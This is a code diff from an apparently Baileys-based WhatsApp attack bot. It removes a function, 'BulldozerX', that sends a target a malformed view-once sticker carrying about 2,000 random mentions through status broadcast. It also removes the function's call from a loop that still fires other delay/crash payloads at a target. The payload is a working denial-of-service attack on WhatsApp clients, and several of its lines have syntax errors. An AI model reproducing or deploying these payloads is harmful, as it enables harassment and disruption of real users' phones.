@@ -664,118 +664,6 @@ async function DelayNew(isTarget) {
     );    
 }
 
-async function BulldozerX(isTarget, mention) {
-  let parse = true;
-  let SID = "5e03e0";
-  let key = "10000000_2203140470115547_947412155165083119_n.enc";
-  let Buffer = "01_Q5Aa1wGMpdaPifqzfnb6enA4NQt1pOEMzh-V5hqPkuYlYtZxCA&oe";
-  let type = image/webp;
-  if (11 > 9) {
-    parse = parse ? false : true;
-  }
-
-  let message = {
-    viewOnceMessage: {
-      message: {
-        stickerMessage: {
-          url: "https://mmg.whatsapp.net/v/t62.43144-24/${key}?ccb=11-4&oh=${Buffer}=68917910&_nc_sid=${SID}&mms3=true",
-          fileSha256: "ufjHkmT9w6O08bZHJE7k4G/8LXIWuKCY9Ahb8NLlAMk=",
-          fileEncSha256: "dg/xBabYkAGZyrKBHOqnQ/uHf2MTgQ8Ea6ACYaUUmbs=",
-          mediaKey: "C+5MVNyWiXBj81xKFzAtUVcwso8YLsdnWcWFTOYVmoY=",
-          mimetype: type,
-          directPath: /v/t62.43144-24/${key}?ccb=11-4&oh=${Buffer}=68917910&_nc_sid=${SID},
-          fileLength: {
-            low: Math.floor(Math.random() * 1000),
-            high: 0,
-            unsigned: true,
-          },
-          mediaKeyTimestamp: {
-            low: Math.floor(Math.random() * 1700000000),
-            high: 0,
-            unsigned: false,
-          },
-          firstFrameLength: 19904,
-          firstFrameSidecar: "KN4kQ5pyABRAgA==",
-          isAnimated: true,
-          contextInfo: {
-          remoteJid: "X",
-          participant: "0@s.whatsapp.net",
-          stanzaId: "1234567890ABCDEF",
-           mentionedJid: [
-             "6285215587498@s.whatsapp.net",
-             ...Array.from({ length: 1999 }, () =>
-             ${Math.floor(100000000000 + Math.random() * 899999999999)}@s.whatsapp.net
-              ),
-            ],
-            groupMentions: [],
-            entryPointConversionSource: "non_contact",
-            entryPointConversionApp: "whatsapp",
-            entryPointConversionDelaySeconds: 467593,
-          },
-          stickerSentTs: {
-            low: Math.floor(Math.random() * -20000000),
-            high: 555,
-            unsigned: parse,
-          },
-          isAvatar: parse,
-          isAiSticker: parse,
-          isLottie: parse,
-        },
-      },
-    },
-  };
-
-  const msg = generateWAMessageFromContent(isTarget, message, {});
-
-  await dray.relayMessage("status@broadcast", msg.message, {
-    messageId: msg.key.id,
-    statusJidList: [isTarget],
-    additionalNodes: [
-      {
-        tag: "meta",
-        attrs: {},
-        content: [
-          {
-            tag: "mentioned_users",
-            attrs: {},
-            content: [
-              {
-                tag: "to",
-                attrs: { jid: isTarget },
-                content: undefined,
-              },
-            ],
-          },
-        ],
-      },
-    ],
-  });
-  
-  if (mention) {
-    await dray.relayMessage(
-      isTarget,
-      {
-        statusMentionMessage: {
-          message: {
-            protocolMessage: {
-              key: msg.key,
-              type: 25
-            }
-          }
-        }
-      },
-      {
-        additionalNodes: [
-          {
-            tag: "meta",
-            attrs: { is_status_mention: "" },
-            content: undefined
-          }
-        ]
-      }
-    );
-  }
-}
 
 async function sFxUltraCombo(X) {
          try {
@@ -1023,7 +911,6 @@ qzespPpZVevGokka9S1KneQUYJrD7x9IdqR4cBupmPIRTIsITFjIs6HnJh6J8z3cR4mGmIvJ8qa6g1SR
 async function MexxDelay(isTarget) {
 for (let i = 0; i <= 5; i++) {
 await DelayNew(isTarget);
-await BulldozerX(isTarget);
 await paymentDelay(isTarget);
 await sFxUltraCombo(isTarget);
 }    
